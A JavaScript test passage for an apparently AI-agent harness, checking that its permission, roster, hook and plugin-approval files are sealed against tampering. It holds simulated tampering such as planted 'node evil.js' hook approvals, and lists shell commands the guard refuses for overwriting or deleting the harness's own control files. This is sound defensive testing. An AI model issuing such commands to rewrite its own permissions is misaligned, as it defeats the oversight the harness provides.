/* node test/authority-seal.test.js — THE AUTHORITY FILES CARRY A SEAL (GHSA-2hpj-9wm7-rvg5 #3, 2026-11-08).

   permissions.bypass.json, agent.roster.json, hooks.json, hooks-allowed.json and plugins-allowed.json said what the
   station may do without asking, as plain JSON any same-user process could write. This locks the fix:
     1. sidecar/authority-seal.js: a seal binds a file's name and canonical content to a key from the OS credential
        store; unsealed, edited, renamed or re-keyed content is refused, once noticed, with a copy kept;
     2. boot(): the first keyed boot seals what is there (once), a later one never re-seals, and a missing or foreign
        marker is not an upgrade;
     3. clampRoster: a refused roster keeps its agents and loses their Full Access;
     4. connector-vault deriveKey: the seal key comes from the vault key without handing the vault key out;
     5. shellhooks + plugins with a seal: StarNet's writes are sealed and an edited approval approves nothing;
     6. index.js: boot runs before any of the five is read, every read is opened and every write sealed, and
        GET /api/permissions carries the notices; the page shows each once (app.js showSealNotices, lifted and run);
     7. the shell floor's protected-file text check names the five files and the seal record (the stopgap). */
'use strict';
const A = require('./_assert.js');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const S = require('../sidecar/authority-seal.js');

const ROOT = path.join(__dirname, '..');
const read = rel => fs.readFileSync(path.join(ROOT, rel), 'utf8');
const { readSidecarSource } = require('./helpers/source.js');
const IDX = readSidecarSource();   // index.js first, then every sidecar module (test/helpers/source.js)

const KEY = Buffer.alloc(32, 7);
const OTHER = Buffer.alloc(32, 9);
function memMarker() { const m = { value: undefined, writes: 0 }; m.read = () => m.value; m.write = v => { m.value = JSON.parse(JSON.stringify(v)); m.writes++; }; return m; }
function make(key, extra) {
  const marker = (extra && extra.marker) || memMarker();
  const kept = [];
  const seal = S.makeAuthoritySeal(Object.assign({ key, now: () => 1000, marker, keep: name => { kept.push(name); return name + '.unsealed-1'; } }, extra || {}, { marker }));
  return { seal, marker, kept };
}
const roundTrip = v => JSON.parse(JSON.stringify(v));

(async () => {
  // ---- 1. seal / open ----
  {
    const { seal, kept } = make(KEY);
    A.ok(seal.keyed, 'a 32-byte key makes a keyed seal');
    const bypass = { version: 1, on: true, setAt: 5 };
    const sealedBypass = roundTrip(seal.seal('permissions.bypass.json', bypass));
    A.ok(sealedBypass[S.FIELD] && /^[a-f0-9]{64}$/.test(sealedBypass[S.FIELD].mac) && sealedBypass[S.FIELD].v === 1, 'seal() adds { v: 1, mac } under ' + S.FIELD);
    const opened = seal.open('permissions.bypass.json', sealedBypass);
    A.ok(opened.ok, 'a sealed file opens');
    A.eq(opened.value, bypass, 'open() hands back the value without its seal');
    const reordered = { setAt: 5, [S.FIELD]: sealedBypass[S.FIELD], on: true, version: 1 };
    A.ok(seal.open('permissions.bypass.json', reordered).ok, 'key order does not matter (canonical JSON)');
    const edited = Object.assign({}, sealedBypass, { on: false, setAt: 6 });
    A.eq(seal.open('permissions.bypass.json', edited).why, 'mismatch', 'an edited file is refused (mismatch)');
    const allowSealed = roundTrip(seal.seal('hooks-allowed.json', { 'pre\u0000x': { event: 'pre', command: 'x' } }));
    A.eq(seal.open('plugins-allowed.json', allowSealed).why, 'mismatch', 'a file sealed under one name is refused under another (no swapping files)');
    A.eq(seal.open('agent.roster.json', { version: 1, agents: [] }).why, 'unsealed', 'an unsealed file is refused (unsealed)');
    A.eq(seal.open('hooks.json', [{ event: 'pre', command: 'x' }]).why, 'unsealed', 'a legacy array hooks.json is unsealed');
    A.eq(seal.open('hooks.json', Object.assign({}, sealedBypass, { [S.FIELD]: { v: 2, mac: sealedBypass[S.FIELD].mac } })).why, 'mismatch', 'an unknown seal version is refused');
    A.eq(seal.open('hooks.json', Object.assign({}, sealedBypass, { [S.FIELD]: { v: 1, mac: 'zz' } })).why, 'mismatch', 'a malformed mac is refused');
    A.ok(seal.open('agent.roster.json', undefined).ok && seal.open('agent.roster.json', null).ok, 'an absent file opens (it already reads as its default)');
    const notes = seal.notices();
    const names = notes.map(n => n.name);
    A.eq(names.filter(n => n === 'permissions.bypass.json').length, 1, 'a refused file is noticed once, however often it is read (' + JSON.stringify(names) + ')');
    A.ok(notes.some(n => n.name === 'permissions.bypass.json' && /FULL BYPASS is off/.test(n.text) && /changed outside StarNet/.test(n.text)), 'the bypass notice says it is off and why');
    A.ok(notes.some(n => n.name === 'agent.roster.json' && /every agent asks first/.test(n.text)), 'the roster notice says every agent asks first');
    A.ok(notes.some(n => n.name === 'plugins-allowed.json' && /every plugin waits/.test(n.text)), 'the plugin approvals notice says every plugin waits');
    A.ok(notes.every(n => !n.keptAt || /unsealed-1/.test(n.text)), 'a notice names the kept copy');
    A.eq(kept.filter(n => n === 'permissions.bypass.json').length, 1, 'a refused file is copied aside once');
    seal.seal('permissions.bypass.json', { version: 1, on: false, setAt: 9 });
    seal.open('permissions.bypass.json', edited);
    A.eq(seal.notices().filter(n => n.name === 'permissions.bypass.json').length, 2, 'once StarNet writes the file again, a later refusal is a new notice');
    // a different key opens nothing
    const other = make(OTHER).seal;
    A.eq(other.open('permissions.bypass.json', sealedBypass).why, 'mismatch', 'a seal from another key does not open');
  }
  // unkeyed: exactly as before
  {
    const { seal, marker } = make(null);
    A.ok(!seal.keyed, 'no key: unkeyed');
    const v = { version: 1, on: true };
    A.ok(seal.seal('permissions.bypass.json', v) === v, 'unkeyed seal() writes the value unchanged');
    const o = seal.open('permissions.bypass.json', v);
    A.ok(o.ok && o.value.on === true && o.unkeyed, 'unkeyed open() obeys the file, as before');
    A.eq(seal.boot([{ name: 'permissions.bypass.json', read: () => v, write: () => { throw new Error('no'); } }]).mode, 'unkeyed', 'unkeyed boot changes nothing');
    A.eq(marker.writes, 0, 'unkeyed: no marker');
    A.eq(seal.notices().length, 0, 'unkeyed: no notice (a bare station is not warned about every boot)');
    A.ok(!S.makeAuthoritySeal({ key: Buffer.alloc(8) }).keyed, 'a short key is no key');
    const sealedWs = make(null, { marker: { read: () => ({ version: 1 }), write: () => {} } }).seal;
    sealedWs.boot([]);
    A.ok(sealedWs.notices().some(n => n.kind === 'unkeyed-sealed' && /no credential-store key/.test(n.text)), 'unkeyed over a workspace the app sealed: one notice says what that means');
    // review 4d: the DESKTOP app without its key, over a workspace it sealed, holds: safe defaults, no permission change saved
    const sealedMarker = { read: () => ({ version: 1 }), write: () => { throw new Error('a held boot writes no marker'); } };
    const app = make(null, { desktop: true, marker: sealedMarker }).seal;
    const roster = { version: 1, agents: [{ agentId: 'a', approvalMode: 'full' }] };
    A.eq(app.boot([{ name: 'agent.roster.json', read: () => roster, write: () => { throw new Error('no'); } }]).mode, 'held', 'the desktop app without its key over a sealed workspace holds');
    const held = app.open('permissions.bypass.json', v);
    A.ok(held.ok === false && held.why === 'held', 'a present file is not obeyed unchecked: it reads as its safe default');
    A.ok(app.open('hooks.json', undefined).ok === true, 'an absent file is its default, as always');
    A.eq(app.openParts('cron.jobs.json', { v: 1, g: 1, macs: {} }, { a: 1 }), { held: true }, 'a routine\'s grants are not obeyed either');
    let threw = '';
    try { app.seal('permissions.bypass.json', { version: 1, on: false }); } catch (e) { threw = String(e && e.message); }
    A.ok(/could not read its key from this computer's credential store/.test(threw) && /Restart StarNet/.test(threw), 'a permission change is refused, and says why: ' + threw);
    A.ok(/could not read its key/.test(app.held), 'the routes read the same reason (authoritySeal.held -> 409)');
    A.ok(app.notices().some(n => n.kind === 'held' && /FULL BYPASS is off, every agent asks first/.test(n.text) && /credential store/.test(n.text)), 'one notice says what holding means and what to check');
    // ...while a bare or pm2 station with no key never holds, sealed workspace or not
    for (const marker of [sealedMarker, { read: () => undefined, write: () => {} }, { read: () => { throw new Error('EBUSY'); }, write: () => {} }]) {
      const bare = make(null, { marker }).seal;
      A.eq(bare.boot([{ name: 'agent.roster.json', read: () => roster, write: () => {} }]).mode, 'unkeyed', 'a bare station without a key is unkeyed, never held');
      A.ok(bare.open('agent.roster.json', roster).ok === true && bare.held === '' && bare.seal('agent.roster.json', roster) === roster, 'and reads and writes as before');
    }
    // the desktop app without its key over a workspace nobody sealed (a first run): nothing to hold, as before
    const fresh = make(null, { desktop: true, marker: { read: () => undefined, write: () => {} } }).seal;
    A.eq(fresh.boot([]).mode, 'unkeyed', 'the desktop app over an unsealed workspace is unkeyed, as before');
    A.ok(/desktop: DESKTOP_SHELL,/.test(fs.readFileSync(path.join(__dirname, '..', 'sidecar', 'index.js'), 'utf8')), 'index.js tells the seal when it is the desktop app\'s station');
  }

  // ---- 2. boot ----
  function disk(initial) {
    const files = Object.assign({}, initial);
    const writes = [];
    const list = S.NAMES.map(name => ({
      name,
      wrap: name === 'hooks.json' ? (v => Array.isArray(v) ? { hooks: v } : v) : undefined,
      read: () => files[name] === undefined ? undefined : roundTrip(files[name]),
      write: v => { if (files['!fail'] === name) throw new Error('EBUSY'); writes.push(name); files[name] = roundTrip(v); }
    }));
    return { files, writes, list };
  }
  {
    const d = disk({ 'permissions.bypass.json': { version: 1, on: true }, 'hooks.json': [{ event: 'pre', command: 'x' }], 'hooks-allowed.json': { 'pre\u0000x': { event: 'pre', command: 'x' } } });
    const { seal, marker } = make(KEY);
    const r = seal.boot(d.list);
    A.eq(r.mode, 'migrated', 'first keyed boot with files and no marker: the upgrade');
    A.eq(r.sealed.sort(), ['hooks-allowed.json', 'hooks.json', 'permissions.bypass.json'], 'it seals every present file, as it is');
    A.ok(marker.writes === 1 && marker.value && marker.value[S.FIELD], 'and writes the sealed marker');
    // final review #5 (defence in depth): FULL BYPASS is not taken on the upgrade's word; it is turned on again at the desk
    A.ok(seal.open('permissions.bypass.json', d.files['permissions.bypass.json']).value.on === false, 'a migrated FULL BYPASS is sealed off (turned on again at the desk)');
    A.eq(seal.open('hooks.json', d.files['hooks.json']).value, { hooks: [{ event: 'pre', command: 'x' }] }, 'a legacy array hooks.json is wrapped as { hooks } and sealed');
    const n = seal.notices().find(x => x.kind === 'migrated');
    A.ok(n && /sealed/.test(n.text) && /once, on this upgrade/.test(n.text) && /hooks\.json/.test(n.text), 'the upgrade is one visible notice naming what was sealed (' + (n && n.text) + ')');
    // second boot: the marker verifies, nothing is rewritten
    const again = make(KEY, { marker: marker });
    const writesBefore = d.writes.length;
    A.eq(again.seal.boot(d.list).mode, 'enforce', 'a later boot with a good marker enforces');
    A.eq(d.writes.length, writesBefore, 'and seals nothing again');
    // an unsealed file written after the upgrade is refused at the next boot
    d.files['plugins-allowed.json'] = { evil: { digest: 'x' } };
    A.eq(again.seal.open('plugins-allowed.json', d.files['plugins-allowed.json']).why, 'unsealed', 'a file written outside StarNet after the upgrade is refused, not migrated');
  }
  {
    // the marker removed but the files sealed: not an upgrade, nothing re-sealed
    const pre = make(KEY).seal;
    const d = disk({ 'agent.roster.json': roundTrip(pre.seal('agent.roster.json', { version: 1, agents: [] })), 'permissions.bypass.json': { version: 1, on: true } });
    const { seal, marker } = make(KEY);
    const r = seal.boot(d.list);
    A.eq(r.mode, 'enforce', 'no marker but a sealed file present: not an upgrade');
    A.eq(d.writes.length, 0, 'nothing is re-sealed');
    A.ok(seal.notices().some(x => x.kind === 'marker-missing'), 'the missing marker is noticed');
    A.ok(marker.writes === 1, 'the marker is written again');
    A.eq(seal.open('permissions.bypass.json', d.files['permissions.bypass.json']).why, 'unsealed', 'so an unsealed bypass planted beside sealed files is refused');
    A.eq(seal.open('agent.roster.json', d.files['agent.roster.json']).why, 'stale', 'and without the record of floors no sealed copy opens either (review 4c)');
  }
  {
    // the marker sealed by another key (credential-store entry reset, or edited): not an upgrade
    const foreign = make(OTHER);
    foreign.seal.seal('agent.roster.json', { version: 1, agents: [] });   // writes OTHER's marker
    const d = disk({ 'permissions.bypass.json': { version: 1, on: true } });
    const { seal } = make(KEY, { marker: foreign.marker });
    A.eq(seal.boot(d.list).mode, 'enforce', 'a marker that does not verify: enforce');
    A.eq(d.writes.length, 0, 'nothing is re-sealed under a foreign marker');
    A.ok(seal.notices().some(x => x.kind === 'marker-mismatch'), 'the foreign marker is noticed');
    const unreadable = make(KEY, { marker: { read: () => { throw new Error('EBUSY'); }, write: () => {} } });
    A.eq(unreadable.seal.boot(d.list).mode, 'held', 'an unreadable marker is not an upgrade either: the boot is held');
  }
  {
    // nothing to migrate: no marker until the first sealed write (a stationless boot writes nothing)
    const d = disk({});
    const { seal, marker } = make(KEY);
    A.eq(seal.boot(d.list).mode, 'enforce', 'no files and no marker: enforce');
    A.eq(marker.writes, 0, 'no marker is written for a station with nothing to seal');
    seal.seal('permissions.bypass.json', { version: 1, on: false });
    A.eq(marker.writes, 1, 'the first sealed write brings the marker');
  }
  {
    // a file that cannot be sealed at the upgrade is named, and then refused like any unsealed file
    const d = disk({ 'hooks-allowed.json': { a: 1 }, 'plugins-allowed.json': { p: { digest: 'd' } } });
    d.files['!fail'] = 'plugins-allowed.json';
    const { seal } = make(KEY);
    const r = seal.boot(d.list);
    A.eq(r.failed, ['plugins-allowed.json'], 'a failed seal is reported');
    A.ok(/could not be sealed/.test(seal.notices().find(x => x.kind === 'migrated').text), 'and the notice says so');
  }

  // ---- 3. clampRoster ----
  {
    const c = S.clampRoster({ version: 1, updatedAt: 9e15, saveRevision: 99, agents: [{ agentId: 'a', name: 'NOVA', approvalMode: 'full', executionProfile: 'this-computer', system: 's', model: 'm' }, 'junk'] });
    A.eq(c, { version: 1, agents: [{ agentId: 'a', name: 'NOVA', approvalMode: 'ask', system: 's', model: 'm' }] }, 'a refused roster keeps who the agents are, asks first, drops the envelope and the future stamp');
    A.eq(S.clampRoster(null), { version: 1, agents: [] }, 'a refused non-roster is an empty roster');
  }

  // ---- 4. connector-vault deriveKey ----
  {
    const { makeConnectorVault } = require('../sidecar/connector-vault.js');
    const hex = 'ab'.repeat(32);
    const v = makeConnectorVault({ fs, path, keyHex: hex });
    const k1 = v.deriveKey(S.LABEL), k2 = v.deriveKey(S.LABEL), k3 = v.deriveKey('other');
    A.ok(Buffer.isBuffer(k1) && k1.length === 32 && k1.equals(k2), 'deriveKey is a stable 32-byte key');
    A.ok(!k1.equals(k3) && !k1.equals(Buffer.from(hex, 'hex')), 'one label, one key, never the vault key itself');
    A.eq(makeConnectorVault({ fs, path }).deriveKey(S.LABEL), null, 'no vault key: no derived key (unkeyed)');
  }

  // ---- 5. shellhooks + plugins with a seal ----
  function memFs() {
    const files = {};
    return {
      files,
      readFile: async f => { if (!(f in files)) { const e = new Error('ENOENT'); e.code = 'ENOENT'; throw e; } return files[f]; },
      writeFile: async (f, d) => { files[f] = String(d); },
      readdir: async () => { const e = new Error('ENOENT'); e.code = 'ENOENT'; throw e; }
    };
  }
  {
    const { makeShellHooks } = require('../sidecar/shellhooks.js');
    const fsp = memFs();
    const { seal } = make(KEY);
    const hooks = makeShellHooks({ spawn: () => { throw new Error('no spawn in this test'); }, fsp, pathMod: path, hooksFile: '/ws/hooks.json', allowFile: '/ws/hooks-allowed.json', seal });
    const c = await hooks.create({ event: 'pre_tool_call', command: 'node check.js' });
    A.ok(c.ok, 'a typed hook is created');
    A.ok(JSON.parse(fsp.files['/ws/hooks.json'])[S.FIELD] && JSON.parse(fsp.files['/ws/hooks-allowed.json'])[S.FIELD], 'both hook files are written sealed');
    A.eq((await hooks.load()).hooks.length, 1, 'a sealed hooks.json loads');
    A.eq((await hooks.listPending()).length, 0, 'a sealed approval approves');
    // a process writes its own approval in: refused, the hook goes back to waiting
    const allow = JSON.parse(fsp.files['/ws/hooks-allowed.json']);
    allow['pre_tool_call\u0000node evil.js'] = { event: 'pre_tool_call', command: 'node evil.js' };
    fsp.files['/ws/hooks-allowed.json'] = JSON.stringify(allow);
    const hk = JSON.parse(fsp.files['/ws/hooks.json']);
    hk.hooks.push({ event: 'pre_tool_call', command: 'node evil.js' });
    fsp.files['/ws/hooks.json'] = JSON.stringify(hk);
    A.eq((await hooks.load()).hooks.length, 0, 'an edited hooks.json loads no hooks');
    fsp.files['/ws/hooks.json'] = JSON.stringify(seal.seal('hooks.json', hk));   // (only to look at the allowlist alone)
    const pending = await hooks.listPending();
    A.ok(pending.length === 2, 'an edited approval list approves nothing: every hook waits (' + pending.length + ')');
    A.ok(seal.notices().some(n => n.name === 'hooks-allowed.json' && /every hook waits/.test(n.text)), 'and the station says so');
    // no seal (a bare station): unchanged behaviour
    const plain = memFs();
    const bare = makeShellHooks({ spawn: () => {}, fsp: plain, pathMod: path, hooksFile: '/ws/hooks.json', allowFile: '/ws/hooks-allowed.json' });
    await bare.create({ event: 'pre_tool_call', command: 'node check.js' });
    A.ok(!(S.FIELD in JSON.parse(plain.files['/ws/hooks.json'])), 'without a seal the files are written as before');
    A.eq((await bare.listPending()).length, 0, 'and obeyed as before');
  }
  {
    const { makePluginLoader } = require('../sidecar/plugins.js');
    const fsp = memFs();
    const { seal } = make(KEY);
    const loader = makePluginLoader({ fsp, pathMod: path, dir: '/ws/plugins', allowFile: '/ws/plugins-allowed.json', requireModule: () => ({}), hash: s => String(s).length.toString(16), seal, onError: () => {} });
    A.ok(await loader.allow('demo', 'abc'), 'a plugin approval is written');
    A.ok(JSON.parse(fsp.files['/ws/plugins-allowed.json'])[S.FIELD], 'sealed');
    A.ok(await loader.revoke('demo'), 'a sealed approval can be revoked (it was read back)');
    await loader.allow('demo', 'abc');
    const raw = JSON.parse(fsp.files['/ws/plugins-allowed.json']);
    raw.evil = { digest: 'zzz' };
    fsp.files['/ws/plugins-allowed.json'] = JSON.stringify(raw);
    A.ok(!(await loader.revoke('evil')), 'an edited approval list reads as empty: the planted entry is not there to revoke');
    A.ok(seal.notices().some(n => n.name === 'plugins-allowed.json'), 'and the station says so');
  }

  // ---- 6. index.js wiring ----
  {
    const at = s => IDX.indexOf(s);
    A.ok(at('const authoritySealBoot = authoritySeal.boot(') > 0, 'index.js runs the seal boot');
    A.ok(at('const authoritySealBoot = authoritySeal.boot(') < at('function loadAgentRoster()') && at('const authoritySealBoot = authoritySeal.boot(') < at('let masterBypassFlag = loadMasterBypass();'), 'the seal boot runs before the roster or bypass is read');
    A.ok(at('const authoritySealBoot = authoritySeal.boot(') < at('const shellHooks = makeShellHooks({') && at('const authoritySealBoot = authoritySeal.boot(') < at('const pluginLoader = makePluginLoader({'), 'and before hooks or plugins are built');
    A.ok(IDX.includes("key: connectorVault.deriveKey(authoritySealMod.LABEL)"), 'the key is derived from the credential-store key');
    const bypassLoad = IDX.slice(at('function loadMasterBypass() {'), at('let masterBypassFlag = loadMasterBypass();'));
    A.ok(/authorityOpen\('permissions\.bypass\.json', loadResilient\(BYPASS_FILE/.test(bypassLoad), 'the bypass read is opened (unsealed -> off)');
    A.ok(IDX.includes("saveResilient(BYPASS_FILE, authoritySeal.seal('permissions.bypass.json', {"), 'the bypass write is sealed');
    const rosterLoad = IDX.slice(at('function loadAgentRoster() {'), at('function loadAgentRoster() {') + 1200);
    A.ok(/authoritySeal\.open\('agent\.roster\.json', stored\)/.test(rosterLoad) && /authoritySealMod\.clampRoster\(stored\)/.test(rosterLoad), 'the roster read is opened, and a refused one is clamped');
    A.ok(IDX.includes("saveResilient(AGENT_ROSTER_FILE, authoritySeal.seal('agent.roster.json', {"), 'the roster write is sealed');
    const hooksWiring = IDX.slice(at('const shellHooks = makeShellHooks({'), at('const shellHooks = makeShellHooks({') + 400);
    A.ok(/seal: authoritySeal/.test(hooksWiring), 'shell hooks get the seal');
    const pluginWiring = IDX.slice(at('const pluginLoader = makePluginLoader({'), at('const pluginLoader = makePluginLoader({') + 800);
    A.ok(/seal: authoritySeal/.test(pluginWiring), 'the plugin loader gets the seal');
    const list = IDX.slice(at('function handlePermissionsList(req, res) {'), at('function handlePermissionsList(req, res) {') + 900);
    A.ok(/authoritySeal: \{ keyed: authoritySeal\.keyed, mode: authoritySealBoot\.mode, notices: authoritySeal\.notices\(\) \}/.test(list), 'GET /api/permissions carries the seal notices');
    A.ok(/delete process\.env\.STARNET_CONNECTOR_ENCRYPTION_KEY/.test(IDX.slice(0, 4000)), 'the credential-store key still leaves the environment at boot (no child inherits it)');
  }
  // the page shows each notice once
  {
    const app = read('frontend/app/app.js');
    A.ok(app.includes("load: () => Harness.api.get('/api/permissions').then(r => { showSealNotices(r); return r; }),"), 'the permissions load shows the seal notices');
    const start = app.indexOf('  const shownSealNotices = new Set();');
    const end = app.indexOf('  function settleRefusedRaise(ids, why) {');
    A.ok(start > 0 && end > start, 'showSealNotices is in app.js');
    const shown = [];
    const ctx = vm.createContext({ StationUI: { notify: (t, k) => shown.push([t, k]) } });
    vm.runInContext(app.slice(start, end) + '\nthis.showSealNotices = showSealNotices;', ctx);
    const r = { authoritySeal: { notices: [{ kind: 'migrated', at: 1, text: 'sealed once' }, { kind: 'unsealed', name: 'hooks.json', at: 2, text: 'hooks.json was changed' }, { kind: 'x', at: 3 }] } };
    ctx.showSealNotices(r); ctx.showSealNotices(r); ctx.showSealNotices(null); ctx.showSealNotices({});
    A.eq(shown, [['sealed once', 'info'], ['hooks.json was changed', 'warn']], 'each notice is shown once; the upgrade as info, a refusal as a warning');
  }

  // ---- 7. the shell floor names the authority files (stopgap) ----
  {
    const Shell = require('../sidecar/tools/builtin/shell.js');
    const why = 'that path is a protected harness control file';
    for (const cmd of ['type permissions.bypass.json', 'echo {} > agent.roster.json', 'copy x hooks-allowed.json', 'Set-Content plugins-allowed.json {}', 'del authority-seal.json', 'cat PERMISSIONS.BYPASS.JSON'])
      A.eq(Shell.escapesWorkspace(cmd), why, 'the floor refuses: ' + cmd);
    for (const cmd of ['ls -la', 'cat README.md', 'node build.js', 'git log', 'cat hooks.json'])
      A.eq(Shell.escapesWorkspace(cmd), null, 'the text floor lets through: ' + cmd);
  }
  // ---- 7b. F2 (fix-sec2): hooks.json is refused only where it is StarNet's own, by its resolved path ----
  {
    const Shell = require('../sidecar/tools/builtin/shell.js');
    const why = 'that path is a protected harness control file';
    const os = require('os');
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'f2-'));
    const DATA = path.join(tmp, 'StarNet', 'workspaces');              // the data directory (WORKSPACES)
    const JAIL = path.join(DATA, 'agent1');                            // an agent's private workspace inside it
    const PROJ = path.join(tmp, 'proj');                               // a project folder elsewhere
    for (const d of [JAIL, PROJ, path.join(PROJ, '.claude')]) fs.mkdirSync(d, { recursive: true });
    const isWin = process.platform === 'win32';
    const env = { HOME: tmp, USERPROFILE: tmp, LOCALAPPDATA: tmp };
    const risk = (cmd, cwd) => Shell.authorityFileRisk(cmd, { cwd, root: DATA, pathMod: path, fs, isWin, env, home: tmp });
    const sep = path.sep;
    // a project's own hooks.json: let through
    for (const [cmd, cwd] of [['cat hooks.json', PROJ], ['cat .claude' + sep + 'hooks.json', PROJ], ['git add hooks.json', PROJ], ['node gen.js --out=hooks.json', PROJ],
      ['cat hooks.json', JAIL], ['type "my hooks.json"', PROJ], ['grep -n event hooks.json src/hooks.json', PROJ], ['cat ~' + sep + 'proj' + sep + 'hooks.json', PROJ]])
      A.eq(risk(cmd, cwd), null, 'a project\'s own hooks.json is not refused: ' + cmd);
    A.eq(risk('npm test', PROJ), null, 'a command that does not name hooks.json is not looked at');
    // fix-sec2 breakage 11: a `$` that cannot expand in any shell (a regex's end, `$/`) no longer makes the command unresolved
    for (const cmd of ["sed -i 's/a$/b/' hooks.json", "grep -n 'event$' hooks.json", 'sed s/a$/b/ hooks.json', '"jq" ".x" "hooks.json" "a$"'])
      A.eq(risk(cmd, PROJ), null, 'a literal $ is literal: ' + cmd);
    // ...while every $ that can expand, anywhere in the command, still leaves it unresolved (refused)
    for (const cmd of ['cd $X && cat hooks.json', 'cd ${X} && cat hooks.json', 'cd $(pwd) && cat hooks.json', "cd $'\\x2e' && cat hooks.json", 'cd $"x" && cat hooks.json',
      'cd x$ && cat hooks.json', 'echo $[1] && cat hooks.json', 'cd $1 && cat hooks.json', 'cd $= && cat hooks.json', "awk '{print $1}' hooks.json", 'cat $REPO/hooks.json'])
      A.eq(risk(cmd, PROJ), why, 'an expansion it cannot resolve is refused, as before: ' + cmd);
    // StarNet's own: refused, however it is spelled
    const abs = path.join(DATA, 'hooks.json');
    for (const [cmd, cwd] of [
      ['cat "' + abs + '"', PROJ],
      ['cat ' + abs.replace(/\\/g, '/'), PROJ],
      ['cat ' + abs.toUpperCase(), PROJ],
      ['cat hooks.json', DATA],
      ['cd "' + DATA + '" && echo {} > hooks.json', PROJ],
      ['git -C ' + DATA + ' diff hooks.json', PROJ],
      ['cat ~' + sep + 'StarNet' + sep + 'workspaces' + sep + 'hooks.json', PROJ],
      [isWin ? 'type %LOCALAPPDATA%\\StarNet\\workspaces\\hooks.json' : 'cat $HOME/StarNet/workspaces/hooks.json', PROJ],
      ['Get-Content $env:LOCALAPPDATA' + sep + 'StarNet' + sep + 'workspaces' + sep + 'hooks.json', PROJ],
      ['cp x ' + path.join(DATA, 'hooks.json.sealed-last'), PROJ],
      ['cat $SOMEWHERE/hooks.json', PROJ],
      ['cd $SOMEWHERE && cat hooks.json', PROJ],
      ['cat $(dirname x)/hooks.json', PROJ],
      ['cat `pwd`/hooks.json', PROJ]])
      A.eq(risk(cmd, cwd), why, 'StarNet\'s own hooks.json is refused: ' + cmd);
    // by its real path: a link in the project that points into the data directory
    let linked = false;
    try { fs.symlinkSync(DATA, path.join(PROJ, 'sn'), isWin ? 'junction' : 'dir'); linked = true; } catch (_) {}
    if (linked) A.eq(risk('cat sn' + sep + 'hooks.json', PROJ), why, 'a link into the data directory is followed to its real path');
    // without a place to resolve against, the plain name is refused as before
    A.eq(Shell.authorityFileRisk('cat hooks.json', {}), why, 'no cwd or root: every mention is refused, as before');
    A.eq(Shell.authorityFileRisk('cat hooks.json', { cwd: PROJ, pathMod: path }), why, 'no data directory named: refused');
    // the three callers ask it, from where the command runs
    const shellSrc = read('sidecar/tools/builtin/shell.js');
    // review2 #13: Full Power (remoteOwner) skips it only for an untainted run; a run that read outside content is asked too
    A.ok(/const authorityDeny = \(remoteOwner && !shellTainted\) \? null : authorityFileRisk\(cmd, \{ cwd: hostCwd, root: ROOT,/.test(shellSrc), 'shell.exec asks it with its working folder and the data directory (Full Power skips it only when the run is untainted)');
    A.ok(/shell\.authorityFileRisk\(cmd, \{ cwd: hostCwd, root: ROOT,/.test(read('sidecar/tools/builtin/verify.js')), 'verify.run asks it');
    A.ok(/Shell\.escapesWorkspace\(command\) \|\| Shell\.authorityFileRisk\(command, \{ cwd, root: ROOT,/.test(read('sidecar/tools/builtin/terminal.js')), 'the terminal asks it');
    try { if (linked) fs.unlinkSync(path.join(PROJ, 'sn')); } catch (_) { try { fs.rmdirSync(path.join(PROJ, 'sn')); } catch (_) {} }
    fs.rmSync(tmp, { recursive: true, force: true });
  }

  // ---- 8. F1 (fix-sec2): a StarNet without the key on a workspace the app sealed ----
  // One shared "disk": the authority files, their .sealed-last copies and the marker, seen by a keyed and an unkeyed seal.
  function shared() {
    const files = {}, last = {}, mk = memMarker();
    const lastSealed = { read: n => last[n] === undefined ? undefined : roundTrip(last[n]), write: (n, v) => { last[n] = roundTrip(v); }, drop: n => { delete last[n]; } };
    const current = n => files[n] === undefined ? undefined : roundTrip(files[n]);
    const list = S.NAMES.map(name => ({ name, wrap: name === 'hooks.json' ? (v => Array.isArray(v) ? { hooks: v } : v) : undefined,
      read: () => files[name] === undefined ? undefined : roundTrip(files[name]), write: v => { files[name] = roundTrip(v); } }));
    const station = key => S.makeAuthoritySeal({ key, now: () => 5000, marker: mk, keep: n => n + '.unsealed-1', lastSealed, current });
    return { files, last, mk, list, station };
  }
  {
    // the finding, verified: without a sealed copy an unkeyed StarNet's save is refused by the app's next keyed boot
    const d = shared();
    const app = d.station(KEY);
    d.files['agent.roster.json'] = roundTrip(app.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA', approvalMode: 'full' }] }));
    A.ok(d.mk.value, 'the app sealed the workspace (marker written)');
    const old = S.makeAuthoritySeal({ key: null, now: () => 1, marker: d.mk });   // a pre-fix unkeyed StarNet: keeps no copy
    old.boot(d.list);
    d.files['agent.roster.json'] = roundTrip(old.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA 2', approvalMode: 'full' }] }));
    const next = d.station(KEY);
    A.eq(next.boot(d.list).reconciled, [], 'no sealed copy: nothing to reconcile');
    A.eq(next.open('agent.roster.json', d.files['agent.roster.json']).why, 'unsealed', 'so the unkeyed save is refused, as before (the F1 finding)');
  }
  {
    const d = shared();
    const app = d.station(KEY);
    d.files['agent.roster.json'] = roundTrip(app.seal('agent.roster.json', { version: 1, updatedAt: 4000, agents: [
      { agentId: 'a', name: 'NOVA', approvalMode: 'full', executionProfile: 'station-gear' },
      { agentId: 'b', name: 'ORBIT', approvalMode: 'ask', executionProfile: 'station-gear' },
      { agentId: 'd', name: 'DUSK', approvalMode: 'full', executionProfile: 'this-computer' }] }));
    d.files['permissions.bypass.json'] = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: true, setAt: 1 }));
    d.files['hooks.json'] = roundTrip(app.seal('hooks.json', { hooks: [{ event: 'pre', command: 'node a.js' }, { event: 'post', command: 'node b.js' }] }));
    d.files['hooks-allowed.json'] = roundTrip(app.seal('hooks-allowed.json', { 'pre\u0000node a.js': { event: 'pre', command: 'node a.js' } }));
    d.files['plugins-allowed.json'] = roundTrip(app.seal('plugins-allowed.json', { p1: { digest: 'aaa' }, p2: { digest: 'bbb' } }));
    // the desktop app boots without its key (the store did not answer), or a bare station opens the same workspace
    const bare = d.station(null);
    A.eq(bare.boot(d.list).mode, 'unkeyed', 'unkeyed over a sealed workspace');
    A.ok(bare.notices().some(n => n.kind === 'unkeyed-sealed' && /takes away/.test(n.text) && /does not use what one adds/.test(n.text)), 'the unkeyed StarNet says what the app will do with its changes');
    A.ok(bare.open('agent.roster.json', d.files['agent.roster.json']).ok, 'it reads the sealed files as they are (never refuses its own workspace)');
